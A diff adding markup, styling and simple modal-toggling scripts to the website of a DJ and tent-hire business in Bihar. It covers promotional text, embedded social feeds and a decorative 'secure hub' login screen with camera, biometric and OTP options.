+<p>A true titan never rests on its past achievements. As Maa Nirmala DJ & Tent House looks forward to the next decade of dominance, our eyes are fixed firmly on the horizon of technological innovation. <strong>Mr. Lalu Kumar Tanti's</strong> vision for the future involves a massive, aggressive expansion of our technological arsenal. We are actively exploring the integration of AI-driven acoustic mapping to perfectly calibrate our sound systems for any venue's unique architecture automatically. We are investing heavily in the next generation of holographic projection mapping, allowing us to turn the walls of our pandals into living, moving cinematic screens that transport your guests to entirely different worlds. Furthermore, our logistical footprint is expanding, preparing to bring the unmatched "Maa Nirmala Experience" to even wider territories across Bihar and neighboring states. We are constantly upgrading our inventory, ensuring that we possess the most advanced, heart-pounding audio gear and the most luxurious, cutting-edge tent fabrics available on the global market. The future of event management is incredibly bright, and Maa Nirmala will continue to be the blazing vanguard leading the charge.</p>
+
+<h3>Chapter XV: The Final Overture & Call to Action</h3>
+<p>The epic narrative of your life deserves a stage just as magnificent. For years, the people of Beltikri, Katoria, Banka, and beyond have entrusted their most sacred, joyous, and monumental occasions to us. We have proven, event after event, that when you desire absolute perfection, earth-shattering sound, and royal grandeur, there is only one name that commands the industry: <strong>Maa Nirmala DJ & Tent House</strong>. We invite you to step into our world and experience the pinnacle of luxury celebration. Let our visionary founder, <strong>Mr. Lalu Kumar Tanti</strong>, and our dedicated team transform your wildest dreams into a breathtaking reality that will be talked about for generations. Do not settle for the ordinary when the extraordinary is at your fingertips. The stage is set, the lasers are aligned, and the subwoofers are primed. To begin planning your legendary event, reach out to our VIP booking team today. You can contact us directly at <strong>9771617808, 7294969938, or 8544341240</strong>. Choose the absolute best. Choose Maa Nirmala—where your grandest celebration becomes eternal history.</p>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Open the About Modal
+    function openAboutModal() { 
+        document.getElementById('aboutModalOverlay').style.display = 'flex'; 
+    }
+    
+    // Close the About Modal
+    function closeAboutModal() { 
+        document.getElementById('aboutModalOverlay').style.display = 'none'; 
+    }
+    
+    // Close when clicking the dark background outside the box
+    function closeAboutOnOutsideClick(event) {
+        if (event.target.id === 'aboutModalOverlay') { 
+            closeAboutModal(); 
+        }
+    }
+</script>
+      <a href="javascript:void(0)" class="side-link premium-animated-btn" onclick="toggleMenu(); openSocialModal()">
+    <i class="fas fa-camera-retro"></i> Social Posts
+</a>
+
+<style>
+    /* Dark Blurred Overlay */
+    #socialModalOverlay {
+        display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(5, 5, 8, 0.98); backdrop-filter: blur(15px);
+        z-index: 999999; justify-content: center; align-items: center;
+        animation: fadeInOverlay 0.4s ease;
+    }
+    
+    /* The Full-Screen Premium Social Box */
+    .mn-social-box {
+        background: #050507; 
+        border: 2px solid #D4AF37; border-radius: 16px; 
+        width: 98%; max-width: 1200px; /* Massive width for full-screen */
+        height: 95vh; 
+        display: flex; flex-direction: column;
+        position: relative; overflow: hidden;
+        box-shadow: 0 25px 60px rgba(0,0,0,0.95), inset 0 0 30px rgba(212, 175, 55, 0.15);
+        animation: slideUpZoom 0.5s cubic-bezier(0.25, 0.8, 0.25, 1) forwards;
+    }
+
+    /* Social Header & Tabs */
+    .social-header {
+        background: linear-gradient(to bottom, #111, #050507); 
+        padding: 20px; border-bottom: 1px solid rgba(212, 175, 55, 0.3);
+        text-align: center; position: relative;
+    }
+    
+    .social-tabs {
+        display: flex; justify-content: center; gap: 15px; margin-top: 15px;
+    }
+    
+    .s-tab-btn {
+        background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.2);
+        color: #fff; padding: 10px 25px; border-radius: 30px; cursor: pointer;
+        font-family: 'Outfit', sans-serif; font-size: 15px; font-weight: 600;
+        transition: all 0.3s ease; display: flex; align-items: center; gap: 8px;
+    }
+    
+    /* Active States for Tabs */
+    .s-tab-btn.active-ig { background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); border-color: transparent; box-shadow: 0 5px 15px rgba(220, 39, 67, 0.4); }
+    .s-tab-btn.active-fb { background: #1877F2; border-color: transparent; box-shadow: 0 5px 15px rgba(24, 119, 242, 0.4); }
+
+    /* Feed Content Area */
+    .social-content-area {
+        flex-grow: 1; padding: 20px; overflow-y: auto; display: flex; justify-content: center;
+    }
+    .social-content-area::-webkit-scrollbar { width: 6px; }
+    .social-content-area::-webkit-scrollbar-thumb { background: #D4AF37; border-radius: 10px; }
+
+    /* Individual Feed Containers */
+    .feed-container { display: none; width: 100%; height: 100%; animation: fadeInOverlay 0.5s ease; }
+    .feed-container.active { display: flex; flex-direction: column; align-items: center; }
+
+    /* Custom Instagram Grid Styling */
+    .ig-grid {
+        display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; width: 100%; max-width: 900px; margin-top: 20px;
+    }
+    .ig-post {
+        background: #111; border-radius: 12px; overflow: hidden; border: 1px solid rgba(212, 175, 55, 0.2);
+        aspect-ratio: 1/1; display: flex; justify-content: center; align-items: center; position: relative;
+        transition: 0.3s; cursor: pointer;
+    }
+    .ig-post:hover { border-color: #D4AF37; transform: translateY(-5px); box-shadow: 0 10px 20px rgba(212, 175, 55, 0.2); }
+    .ig-post i { font-size: 40px; color: rgba(255,255,255,0.2); }
+</style>
+
+<div id="socialModalOverlay" onclick="closeSocialOnOutsideClick(event)">
+    <div class="mn-social-box" id="socialBoxContent">
+        
+        <div class="social-header">
+            <span onclick="closeSocialModal()" style="position:absolute; top:15px; right:25px; color:#fff; font-size:35px; line-height:1; cursor:pointer; transition:0.3s;">&times;</span>
+            <h2 style="margin:0; color:#fff; font-family:'Cinzel', serif; font-size:24px; font-weight:800; letter-spacing:1px;">
+                <i class="fas fa-globe"></i> Live Social Feeds
+            </h2>
+            
+            <div class="social-tabs">
+                <button class="s-tab-btn active-ig" id="btn-ig" onclick="switchSocialTab('ig')">
+                    <i class="fab fa-instagram"></i> Instagram
+                </button>
+                <button class="s-tab-btn" id="btn-fb" onclick="switchSocialTab('fb')">
+                    <i class="fab fa-facebook-f"></i> Facebook
+                </button>
+            </div>
+        </div>
+        
+        <div class="social-content-area">
+            
+            <div id="feed-ig" class="feed-container active">
+                <div style="text-align: center; margin-bottom: 20px;">
+                    <img src="https://i.postimg.cc/qMWWzWbF/Screenshot-2026-01-14-15-29-44-90-965bbf4d18d205f782c6b8409c5773a4.jpg" style="width:80px; height:80px; border-radius:50%; border:3px solid #cc2366; object-fit:cover;">
+                    <h3 style="color:#fff; font-family:'Outfit', sans-serif; margin: 10px 0 5px 0;">@maa_nirmala_dj</h3>
+                    <a href="https://www.instagram.com/maa_nirmala_dj" target="_blank" style="color:#D4AF37; text-decoration:none; font-family:'Outfit', sans-serif; font-size:14px; border: 1px solid #D4AF37; padding: 5px 15px; border-radius: 20px; display:inline-block; margin-top:5px;">Follow Us on Instagram</a>
+                </div>
+                
+                <div class="ig-grid">
+                    <a href="https://www.instagram.com/maa_nirmala_dj" target="_blank" class="ig-post"><i class="fab fa-instagram"></i><div style="position:absolute; bottom:10px; color:#fff; font-family:'Outfit', sans-serif; font-size:12px; font-weight:bold;">View Post</div></a>
+                    <a href="https://www.instagram.com/maa_nirmala_dj" target="_blank" class="ig-post"><i class="fab fa-instagram"></i><div style="position:absolute; bottom:10px; color:#fff; font-family:'Outfit', sans-serif; font-size:12px; font-weight:bold;">View Post</div></a>
+                    <a href="https://www.instagram.com/maa_nirmala_dj" target="_blank" class="ig-post"><i class="fab fa-instagram"></i><div style="position:absolute; bottom:10px; color:#fff; font-family:'Outfit', sans-serif; font-size:12px; font-weight:bold;">View Post</div></a>
+                    <a href="https://www.instagram.com/maa_nirmala_dj" target="_blank" class="ig-post"><i class="fab fa-instagram"></i><div style="position:absolute; bottom:10px; color:#fff; font-family:'Outfit', sans-serif; font-size:12px; font-weight:bold;">View Post</div></a>
+                    <a href="https://www.instagram.com/maa_nirmala_dj" target="_blank" class="ig-post"><i class="fab fa-instagram"></i><div style="position:absolute; bottom:10px; color:#fff; font-family:'Outfit', sans-serif; font-size:12px; font-weight:bold;">View Post</div></a>
+                    <a href="https://www.instagram.com/maa_nirmala_dj" target="_blank" class="ig-post"><i class="fab fa-instagram"></i><div style="position:absolute; bottom:10px; color:#fff; font-family:'Outfit', sans-serif; font-size:12px; font-weight:bold;">View Post</div></a>
+                </div>
+            </div>
+
+            <div id="feed-fb" class="feed-container">
+                <div style="background:#fff; padding:10px; border-radius:12px; width:100%; max-width:500px; height:100%;">
+                    <iframe src="https://www.facebook.com/plugins/page.php?href=https%3A%2F%2Fwww.facebook.com%2FMaaNirmalaDJ7&tabs=timeline&width=500&height=800&small_header=false&adapt_container_width=true&hide_cover=false&show_facepile=true&appId" width="100%" height="100%" style="border:none;overflow:hidden; min-height:600px;" scrolling="yes" frameborder="0" allowfullscreen="true" allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share"></iframe>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+<script>
+    function openSocialModal() { document.getElementById('socialModalOverlay').style.display = 'flex'; }
+    function closeSocialModal() { document.getElementById('socialModalOverlay').style.display = 'none'; }
+    function closeSocialOnOutsideClick(event) { if (event.target.id === 'socialModalOverlay') closeSocialModal(); }
+    
+    // Logic to switch between Instagram and Facebook views
+    function switchSocialTab(platform) {
+        if(typeof playTap === 'function') playTap();
+        
+        // Get elements
+        const btnIg = document.getElementById('btn-ig');
+        const btnFb = document.getElementById('btn-fb');
+        const feedIg = document.getElementById('feed-ig');
+        const feedFb = document.getElementById('feed-fb');
+        
+        // Reset everything
+        btnIg.className = 's-tab-btn';
+        btnFb.className = 's-tab-btn';
+        feedIg.classList.remove('active');
+        feedFb.classList.remove('active');
+        
+        // Apply active state
+        if(platform === 'ig') {
+            btnIg.className = 's-tab-btn active-ig';
+            feedIg.classList.add('active');
+        } else if(platform === 'fb') {
+            btnFb.className = 's-tab-btn active-fb';
+            feedFb.classList.add('active');
+        }
+    }
+</script>
+        
+        <a href="mailto:maa.nirmala.dj.beltikri@gmail.com" class="side-link"><i class="fas fa-envelope"></i> Email</a>
+        <a href="javascript:void(0)" class="media-file-btn" onclick="openSecureHub()">
+    <div class="media-icon-wrapper">
+        <i class="fas fa-paperclip"></i>
+    </div>
+    <div class="media-btn-text">
+        <span class="m-title">Access Secure Hub</span>
+        <span class="m-sub">Encrypted Multi-Factor Login</span>
+    </div>
+    <i class="fas fa-chevron-right media-arrow"></i>
+</a>
+
+<div id="mndPushNotif" class="mnd-push-hidden">
+    <div class="mnd-push-header">
+        <div style="display:flex; align-items:center; gap:8px;">
+            <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" alt="Logo">
+            <span>MND Security Alert</span>
+        </div>
+        <span class="mnd-push-close" onclick="closePushNotif()">×</span>
+    </div>
+    <div class="mnd-push-body">
+        Maa Nirmala DJ Security:<br>
+        Your secure login code has been generated. Tap to copy.
+    </div>
+    <div class="mnd-push-otp" id="mndPushOtpText" onclick="copyPushOTP()" title="Tap to Copy">******</div>
+    <div class="mnd-push-footer">Swipe left or right to dismiss</div>
+</div>
+
+<div id="hubAuthModal" class="hub-modal-overlay" style="display:none;">
+    <div class="hub-modal-box">
+        
+        <div class="hub-header">
+            <span class="hub-close-btn" onclick="closeHubModal()">×</span>
+            <div class="hub-static-ring">
+                <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" class="hub-logo">
+            </div>
+            <h2><i class="fas fa-shield-alt"></i> MFA SECURE LOGIN</h2>
+        </div>
+
+        <div class="hub-body">
+            
+            <div id="hubStep1">
+                <p class="hub-instruction">Enter your identity matrix to proceed.</p>
+                
+                <div class="input-group">
+                    <i class="fas fa-user"></i>
+                    <input type="text" id="hubName" autocomplete="name" placeholder="Full Legal Name">
+                </div>
+                
+                <div class="input-group">
+                    <i class="fas fa-envelope"></i>
+                    <input type="email" id="hubEmail" autocomplete="email" placeholder="Email Address (Optional)">
+                </div>
+
+                <div class="input-group">
+                    <i class="fas fa-phone"></i>
+                    <input type="tel" id="hubPhone" autocomplete="tel" placeholder="10-Digit Mobile Number" maxlength="10">
+                </div>
+
+                <div class="mfa-divider"><span>SELECT AUTH METHOD</span></div>
+                
+                <button class="mfa-btn btn-face" onclick="startFaceScanning()">
+                    <i class="fas fa-expand"></i> AI FACE RECOGNITION
+                </button>
+                
+                <button class="mfa-btn btn-lock" onclick="startDeviceLockAuth()">
+                    <i class="fas fa-fingerprint"></i> DEVICE BIOMETRICS / PIN
+                </button>
+
+                <button class="mfa-btn btn-otp" id="btnStandardOtp" onclick="generateStandardOTP()">
+                    <i class="fas fa-comment-sms"></i> STANDARD SMS OTP
+                </button>
+            </div>
+
+            <div id="hubStepFaceID" style="display:none; flex-direction:column; align-items:center;">
+                <p class="hub-instruction" id="faceInstruction" style="font-weight:bold;">Position your face within the frame.</p>
+                
+                <div class="scanner-container">
+                    <video id="hubVideo" autoplay playsinline></video>
+                    <div class="scan-corners"></div>
+                    <div class="scan-laser" id="scanLaser"></div>
+                    <div class="scan-overlay-img"></div>
+                </div>
+                
+                <canvas id="hubCanvas" style="display:none;"></canvas>
+                
+                <button id="hubCaptureBtn" class="mfa-btn btn-face" onclick="executeFaceAnalysis()">
+                    <i class="fas fa-crosshairs"></i> INITIATE NEURAL SCAN
+                </button>
+                <p class="hub-back-link" onclick="resetToMethods()">Cancel & Change Method</p>
+            </div>
+
+            <div id="hubStep2" style="display:none;">
+                <p style="color:#00fa9a; font-size:14px; text-align:center; margin-bottom:15px; font-weight:bold;">
+                    <i class="fas fa-shield-check"></i> Security Code Dispatched
                 </p>
+                <input type="tel" id="hubOtpInput" autocomplete="one-time-code" class="otp-input-box" placeholder="******" maxlength="6">
+                
+                <button class="mfa-btn btn-verify" onclick="verifyHubOTP()">
+                    <i class="fas fa-unlock"></i> DECRYPT & ENTER
+                </button>
+                <p class="hub-back-link" onclick="resetToMethods()">Abort Login</p>
             </div>
         </div>
     </div>
+</div>
+
+<div id="seamlessHubLoader" class="premium-3d-loader" style="display:none;">
+    
+    <div class="cyber-grid-container">
+        <div class="cyber-grid"></div>
+    </div>
+
+    <div class="particle p1"></div>
+    <div class="particle p2"></div>
+    <div class="particle p3"></div>
+
+    <div class="gyroscope-3d">
+        <div class="gyro-ring ring-x"></div>
+        <div class="gyro-ring ring-y"></div>
+        <div class="gyro-ring ring-z"></div>
+        
+        <div class="logo-hologram">
+            <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" alt="MND Logo">
+        </div>
+    </div>
+    
+    <div class="loader-ui-panel">
+        <h2 class="holographic-title" data-text="MAA NIRMALA HUB">MAA NIRMALA HUB</h2>
+        
+        <div class="energy-bar-container">
+            <div class="energy-bar-fill">
+                <div class="energy-spark"></div>
+            </div>
+        </div>
+        
+        <p id="hubLoadText" class="system-status-text">ESTABLISHING SECURE 3D HANDSHAKE<span class="blinking-dots">...</span></p>
+    </div>
+</div>
+
+<style>
+    /* Fullscreen Deep Void Container */
+    .premium-3d-loader {
+        position: fixed; inset: 0;
+        background: radial-gradient(circle at center, #0a0a0c 0%, #000000 100%);
+        z-index: 999999999;
+        display: flex; flex-direction: column;
+        justify-content: center; align-items: center;
+        perspective: 1000px; /* Activates 3D Space */
+        overflow: hidden;
+    }
+
+    /* --- 1. 3D MOVING CYBER GRID --- */
+    .cyber-grid-container {
+        position: absolute; bottom: -20%; left: 0;
+        width: 100%; height: 60%;
+        perspective: 600px;
+        z-index: 0;
+        opacity: 0.4;
+    }
+    .cyber-grid {
+        width: 200%; height: 200%;
+        position: absolute; bottom: 0; left: -50%;
+        background-image: 
+            linear-gradient(to right, rgba(0, 229, 255, 0.3) 1px, transparent 1px),
+            linear-gradient(to bottom, rgba(0, 229, 255, 0.3) 1px, transparent 1px);
+        background-size: 50px 50px;
+        transform: rotateX(75deg);
+        transform-origin: bottom center;
+        animation: gridMove 3s linear infinite, dynamicGridColor 10s infinite alternate;
+        box-shadow: inset 0 0 100px #000;
+    }
+    @keyframes gridMove {
+        0% { transform: rotateX(75deg) translateY(0); }
+        100% { transform: rotateX(75deg) translateY(50px); }
+    }
+    @keyframes dynamicGridColor {
+        0% { filter: hue-rotate(0deg) drop-shadow(0 0 10px #00E5FF); }
+        33% { filter: hue-rotate(90deg) drop-shadow(0 0 10px #FF00FF); }
+        66% { filter: hue-rotate(180deg) drop-shadow(0 0 10px #D4AF37); }
+        100% { filter: hue-rotate(270deg) drop-shadow(0 0 10px #00FA9A); }
+    }
+
+    /* Floating Particles */
+    .particle {
+        position: absolute; border-radius: 50%;
+        background: #fff; filter: blur(5px);
+        animation: floatParticle 8s infinite ease-in-out alternate;
+    }
+    .p1 { width: 50px; height: 50px; background: #D4AF37; top: 20%; left: 20%; opacity: 0.2; }
+    .p2 { width: 80px; height: 80px; background: #00E5FF; bottom: 30%; right: 15%; opacity: 0.15; animation-delay: -3s; }
+    .p3 { width: 30px; height: 30px; background: #FF00FF; top: 40%; right: 30%; opacity: 0.3; animation-delay: -5s; }
+
+    @keyframes floatParticle {
+        0% { transform: translateY(0) scale(1); }
+        100% { transform: translateY(-50px) scale(1.5); }
+    }
+
+    /* --- 2. 3D HOLOGRAPHIC GYROSCOPE --- */
+    .gyroscope-3d {
+        position: relative;
+        width: 180px; height: 180px;
+        transform-style: preserve-3d;
+        animation: rotateGyro 15s infinite linear;
+        z-index: 10;
+        margin-bottom: 50px;
+    }
+    
+    .gyro-ring {
+        position: absolute; inset: 0;
+        border-radius: 50%;
+        border: 4px solid transparent;
+        box-shadow: inset 0 0 20px rgba(255,255,255,0.2), 0 0 20px rgba(255,255,255,0.2);
+    }
+
+    /* Independent 3D Axis Rotations */
+    .ring-x { 
+        border-top-color: #D4AF37; border-bottom-color: #D4AF37; 
+        animation: spinX 3s infinite linear; 
+    }
+    .ring-y { 
+        border-left-color: #00E5FF; border-right-color: #00E5FF; 
+        animation: spinY 4s infinite linear; 
+    }
+    .ring-z { 
+        border-top-color: #FF00FF; border-bottom-color: #00FA9A; 
+        animation: spinZ 5s infinite linear; 
+    }
+
+    .logo-hologram {
+        position: absolute; inset: 25px;
+        background: rgba(0, 0, 0, 0.8);
+        border-radius: 50%; padding: 5px;
+        transform: translateZ(0); /* Anchors logo in center */
+        box-shadow: 0 0 40px var(--mnd-gold);
+        animation: logoBreathing 2s infinite alternate, counterRotate 15s infinite linear;
+    }
+    .logo-hologram img {
+        width: 100%; height: 100%;
+        border-radius: 50%; object-fit: cover;
+        border: 2px solid rgba(212, 175, 55, 0.8);
+    }
+
+    @keyframes rotateGyro { 100% { transform: rotateX(360deg) rotateY(360deg); } }
+    @keyframes counterRotate { 100% { transform: rotateY(-360deg) rotateX(-360deg); } }
+    @keyframes spinX { 100% { transform: rotateX(360deg); } }
+    @keyframes spinY { 100% { transform: rotateY(360deg); } }
+    @keyframes spinZ { 100% { transform: rotateZ(360deg); } }
+    @keyframes logoBreathing {
+        0% { box-shadow: 0 0 20px #D4AF37, inset 0 0 10px #D4AF37; }
+        100% { box-shadow: 0 0 60px #00E5FF, inset 0 0 30px #00E5FF; }
+    }
+
+    /* --- 3. PREMIUM TYPOGRAPHY & UI --- */
+    .loader-ui-panel {
+        z-index: 10;
+        display: flex; flex-direction: column; align-items: center;
+        width: 100%; max-width: 400px; padding: 0 20px;
+    }
+
+    /* Layered 3D Text */
+    .holographic-title {
+        font-family: 'Cinzel', serif; font-size: 28px; font-weight: 900;
+        letter-spacing: 5px; margin-bottom: 20px;
+        color: transparent;
+        background: linear-gradient(90deg, #D4AF37, #FFF, #00E5FF, #D4AF37);
+        background-size: 300% auto;
+        -webkit-background-clip: text;
+        animation: shineGold 4s infinite linear;
+        position: relative;
+    }
+    /* Glowing text reflection */
+    .holographic-title::after {
+        content: attr(data-text);
+        position: absolute; left: 0; top: 0; z-index: -1;
+        color: transparent;
+        text-shadow: 0 0 20px #D4AF37, 0 0 40px #00E5FF;
+        opacity: 0.6;
+    }
+
+    @keyframes shineGold {
+        0% { background-position: 0% center; }
+        100% { background-position: 300% center; }
+    }
+
+    /* Energy Progress Bar */
+    .energy-bar-container {
+        width: 100%; height: 6px;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 20px; margin-bottom: 15px;
+        position: relative; overflow: hidden;
+        box-shadow: inset 0 0 10px #000, 0 0 10px rgba(0, 229, 255, 0.2);
+    }
+    
+    .energy-bar-fill {
+        height: 100%; width: 0%;
+        background: linear-gradient(90deg, #D4AF37, #00E5FF, #FF00FF);
+        background-size: 200% auto;
+        border-radius: 20px;
+        animation: fillEnergy 3.5s cubic-bezier(0.1, 0.7, 0.1, 1) forwards, shineGold 2s infinite linear;
+        position: relative;
+    }
+
+    /* A bright spark flying across the loading bar */
+    .energy-spark {
+        position: absolute; right: 0; top: -5px;
+        width: 20px; height: 16px;
+        background: #fff; border-radius: 50%;
+        box-shadow: 0 0 15px #fff, 0 0 30px #00E5FF;
+        filter: blur(2px);
+    }
+
+    @keyframes fillEnergy {
+        0% { width: 0%; }
+        20% { width: 40%; }
+        60% { width: 70%; }
+        100% { width: 100%; }
+    }
+
+    .system-status-text {
+        font-family: 'Orbitron', sans-serif;
+        color: #D4AF37; font-size: 13px; font-weight: 700;
+        letter-spacing: 3px; text-transform: uppercase;
+        animation: colorCycle 6s infinite alternate;
+    }
+    
+    .blinking-dots { animation: blinkText 1.5s infinite; }
+
+    @keyframes colorCycle {
+        0% { color: #D4AF37; text-shadow: 0 0 10px #D4AF37; }
+        50% { color: #00E5FF; text-shadow: 0 0 10px #00E5FF; }
+        100% { color: #FF00FF; text-shadow: 0 0 10px #FF00FF; }
+    }
+
+    @keyframes blinkText {
+        0%, 100% { opacity: 1; }
+        50% { opacity: 0; }
+    }
+</style>
+<style>
+    /* Media Button Trigger Styles */
+    .media-file-btn {
+        display: flex; align-items: center; justify-content: space-between;
+        background: rgba(20, 20, 20, 0.6); border: 1px solid rgba(212, 175, 55, 0.3);
+        border-radius: 12px; padding: 12px 16px; width: 100%; text-decoration: none;
+        box-sizing: border-box; transition: all 0.3s ease; margin-bottom: 20px;
+        backdrop-filter: blur(5px);
+    }
+    .media-file-btn:active { transform: scale(0.98); border-color: #D4AF37; background: rgba(212, 175, 55, 0.1); }
+    .media-icon-wrapper { width: 40px; height: 40px; border-radius: 50%; background: rgba(212, 175, 55, 0.1); display: flex; justify-content: center; align-items: center; color: #D4AF37; font-size: 18px; }
+    .media-btn-text { flex: 1; margin-left: 15px; display: flex; flex-direction: column; }
+    .m-title { color: #fff; font-family: 'Outfit', sans-serif; font-size: 15px; font-weight: 700; }
+    .m-sub { color: #888; font-family: 'Outfit', sans-serif; font-size: 12px; }
+    .media-arrow { color: #555; font-size: 14px; }
+
+    /* Modal Full Screen Styles */
+    .hub-modal-overlay {
+        position: fixed; inset: 0; background: #050505; z-index: 9999999; display: flex; justify-content: center; align-items: flex-start;
+    }
+    .hub-modal-box {
+        background: linear-gradient(180deg, #111 0%, #050505 100%); width: 100vw; height: 100dvh; max-width: 100%; 
+        border-radius: 0; border: none; overflow-y: auto; position: relative; font-family: 'Outfit', sans-serif;
+        display: flex; flex-direction: column;
+    }
+    .hub-header { padding: 40px 20px 20px; text-align: center; border-bottom: 1px solid rgba(212, 175, 55, 0.1); position: relative; }
+    .hub-close-btn { position: absolute; top: 20px; right: 25px; color: #888; font-size: 32px; cursor: pointer; transition: 0.3s; }
+    .hub-close-btn:hover { color: #ff3333; }
+    
+    /* Static Logo (No Animation) */
+    .hub-static-ring {
+        width: 80px; height: 80px; margin: 0 auto 15px; border-radius: 50%;
+        padding: 3px; background: #D4AF37; box-shadow: 0 0 20px rgba(212, 175, 55, 0.3);
+    }
+    .hub-logo { width: 100%; height: 100%; border-radius: 50%; border: 2px solid #000; object-fit: cover; }
+    .hub-header h2 { margin: 0; color: #D4AF37; font-family: 'Cinzel', serif; font-size: 24px; font-weight: 900; letter-spacing: 1px; }
+
+    /* Inputs Centered */
+    .hub-body { padding: 25px; flex: 1; display: flex; flex-direction: column; max-width: 500px; margin: 0 auto; width: 100%; box-sizing: border-box; }
+    .hub-instruction { color: #aaa; font-size: 14px; text-align: center; margin-bottom: 20px; }
+    .input-group { position: relative; margin-bottom: 15px; }
+    .input-group i { position: absolute; left: 15px; top: 16px; color: #D4AF37; opacity: 0.7; }
+    .input-group input {
+        width: 100%; padding: 15px 15px 15px 45px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); color: #fff; border-radius: 10px; font-family: 'Outfit'; font-size: 16px; box-sizing: border-box; transition: 0.3s;
+    }
+    .input-group input:focus { border-color: #D4AF37; outline: none; background: rgba(212,175,55,0.05); }
+    
+    .mfa-divider { text-align: center; margin: 25px 0; position: relative; }
+    .mfa-divider::before { content: ""; position: absolute; left: 0; top: 50%; width: 100%; height: 1px; background: rgba(255,255,255,0.1); }
+    .mfa-divider span { position: relative; background: #050505; padding: 0 10px; color: #666; font-size: 12px; font-weight: bold; letter-spacing: 1px; }
+
+    /* Buttons */
+    .mfa-btn {
+        width: 100%; padding: 16px; margin-bottom: 15px; border-radius: 10px; font-family: 'Outfit'; font-weight: 800; font-size: 15px; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 10px; transition: 0.3s; border: none;
+    }
+    .btn-face { background: linear-gradient(90deg, #D4AF37, #F3E5AB); color: #000; box-shadow: 0 5px 15px rgba(212,175,55,0.3); }
+    .btn-lock { background: #1a1a1a; border: 1px solid rgba(255,255,255,0.2); color: #fff; }
+    .btn-lock:hover { border-color: #D4AF37; color: #D4AF37; }
+    .btn-otp { background: transparent; border: 1px dashed rgba(212,175,55,0.5); color: #D4AF37; }
+    .btn-verify { background: #00fa9a; color: #000; font-size: 18px; letter-spacing: 1px; box-shadow: 0 5px 15px rgba(0,250,154,0.3); }
+
+    /* Face Scanner UI */
+    .scanner-container {
+        width: 250px; height: 300px; position: relative; border-radius: 20px; overflow: hidden; margin: 0 auto 25px; background: #000; box-shadow: 0 0 30px rgba(212,175,55,0.15);
+    }
+    #hubVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); } 
+    .scan-corners {
+        position: absolute; inset: 10px; border: 2px solid transparent;
+        background: linear-gradient(to right, #D4AF37 4px, transparent 4px) 0 0, linear-gradient(to bottom, #D4AF37 4px, transparent 4px) 0 0, linear-gradient(to left, #D4AF37 4px, transparent 4px) 100% 0, linear-gradient(to bottom, #D4AF37 4px, transparent 4px) 100% 0, linear-gradient(to right, #D4AF37 4px, transparent 4px) 0 100%, linear-gradient(to top, #D4AF37 4px, transparent 4px) 0 100%, linear-gradient(to left, #D4AF37 4px, transparent 4px) 100% 100%, linear-gradient(to top, #D4AF37 4px, transparent 4px) 100% 100%;
+        background-repeat: no-repeat; background-size: 30px 30px; pointer-events: none; z-index: 2;
+    }
+    .scan-laser { position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: #00fa9a; box-shadow: 0 0 15px #00fa9a, 0 0 30px #00fa9a; z-index: 3; animation: scanMove 3s ease-in-out infinite; display: none; }
+    .scan-overlay-img { position: absolute; inset: 0; background: url('https://cdn-icons-png.flaticon.com/512/3256/3256799.png') center/60% no-repeat; opacity: 0.15; filter: invert(1); pointer-events: none; z-index: 1; }
+    .scanner-active .scan-laser { display: block; }
+    .scanner-active .scan-overlay-img { animation: pulseFace 1s infinite; opacity: 0.4; }
+
+    /* OTP Code Input */
+    .otp-input-box { width: 100%; padding: 15px; margin-bottom: 20px; background: rgba(0,0,0,0.5); border: 2px solid #D4AF37; color: #D4AF37; border-radius: 12px; font-family: 'Outfit'; text-align: center; font-size: 32px; letter-spacing: 12px; font-weight: 900; box-sizing: border-box; text-shadow: 0 0 10px rgba(212,175,55,0.5); }
+    .hub-back-link { color: #ff3333; font-size: 14px; text-align: center; margin-top: 20px; cursor: pointer; text-decoration: underline; opacity: 0.8; }
+
+    /* Push Notification Styles */
+    #mndPushNotif { position: fixed; left: 50%; width: 92%; max-width: 400px; background: rgba(15, 15, 15, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(212, 175, 55, 0.4); border-radius: 16px; padding: 16px; z-index: 9999999999; box-shadow: 0 15px 40px rgba(0,0,0,0.9); display: flex; flex-direction: column; gap: 10px; transition: top 0.6s cubic-bezier(0.2, 1, 0.3, 1), transform 0.3s ease, opacity 0.3s ease; }
+    .mnd-push-hidden { top: -300px; opacity: 0; transform: translateX(-50%) scale(0.9); }
+    .mnd-push-visible { top: 25px; opacity: 1; transform: translateX(-50%) scale(1); }
+    .mnd-push-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 8px; }
+    .mnd-push-header img { width: 22px; height: 22px; border-radius: 6px; }
+    .mnd-push-header span { color: #fff; font-size: 13px; font-weight: 700; opacity: 0.9; }
+    .mnd-push-close { color: #fff; font-size: 24px; cursor: pointer; opacity: 0.4; }
+    .mnd-push-body { color: #ccc; font-size: 13px; line-height: 1.5; }
+    .mnd-push-otp { font-size: 38px; font-weight: 900; color: #D4AF37; text-align: center; letter-spacing: 8px; padding: 12px 0; background: rgba(212,175,55,0.08); border-radius: 10px; border: 1px dashed rgba(212,175,55,0.3); cursor: pointer; user-select: none; transition: 0.2s; }
+    .mnd-push-otp:active { transform: scale(0.96); background: rgba(212,175,55,0.2); }
+    .mnd-push-footer { text-align: center; color: #666; font-size: 11px; margin-top: 5px; }
+
+    /* Loader */
+    .loader-rings { width: 100px; height: 100px; border-radius: 50%; border: 3px solid transparent; border-top-color: #D4AF37; border-bottom-color: #00fa9a; animation: rotateGlow 1.5s linear infinite; margin-bottom: 25px; }
+    .loader-logo { width: 60px; position: absolute; top: calc(50% - 65px); border-radius: 50%; }
